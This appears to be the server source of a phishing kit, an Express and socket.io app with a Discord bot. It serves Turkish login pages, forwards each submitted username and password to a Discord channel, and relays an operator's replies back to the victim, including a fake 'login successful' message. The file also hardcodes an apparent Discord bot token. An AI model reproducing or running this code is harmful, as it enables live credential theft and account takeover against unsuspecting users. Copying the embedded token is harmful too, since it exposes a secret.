const app = require('express')();
const express = require('express')
const http = require('http').Server(app);
const io = require('socket.io')(http);
const port = process.env.PORT || 80;
const path = require('path')
const Discord = require('discord.js')
const bodyParser = require('body-parser')
 
const jsonParser = bodyParser.json()
const urlencodedParser = bodyParser.urlencoded({ extended: false })
client = new Discord.Client({intents:[32767 ]})
const useragent = require('express-useragent');
app.use(express.static(path.join(__dirname, '/index/desktop/index_files'))); //  "public" off of current is root
app.use(express.static(path.join(__dirname, '/public'))); //  "public" off of current is root



client.login("ODkzNTEzNjQ3MTM2MDQ3MTI0.GtCFzQ.SkrjMjZsa9I-Z7bd6hGnP7ChF05KhVMZU1Y8Tc");

let channel;
client.on("ready", async() => [
    channel = client.channels.cache.get('1090433362692415519')
])

app.get('/', (req, res) => {
  res.redirect("/tr")
});

app.get('/tr', (req, res) => {
    var source = req.headers['user-agent']
    var ua = useragent.parse(source);
    var isMobile = ua.isMobile

    if(isMobile) res.sendFile(__dirname + '/index/mobile/index.html'); // check phone
    else res.sendFile(__dirname + '/index/desktop/index.html'); //go pc
    
});


app.get('*', function(req, res){
  res.sendFile(__dirname + "/index/desktop/error.html")
});
  
io.on('connection', (socket) => {
  socket.on('login', data => {
    
    console.log('login', data);
    io.emit(`message ${data.id}`, "Sunucuyla iletişim kuruluyor...")
    try{
        channel.send(`login ${data.username} ${data.password} ${data.id}`)
    }catch(err){
        io.emit(`message ${data.id}`, "Sunucuyla iletişim kurulamadı, sayfayı yenileyin...")
    } 
  });
});


app.post("/listdetails", jsonParser, function (req, res) {
    console.log(req.body)
    io.emit(`logged ${req.body.id}`, req.body)
})

client.on("messageCreate", async(message) => {
    if(message.channel.id == "1090438378597662720" && message.content.startsWith("message")){
        
        let id = message.content.split(" ")[1]
        let outmessage = message.content.replace(`message ${id}`, "").replace("true","").replace("false","")
        if(outmessage.includes("₺")) outmessage = "Giriş başarılı"
        io.emit(`message ${id}`, outmessage)
    }
})

http.listen(port, () => {
  console.log(`http://localhost:${port}/`);
});

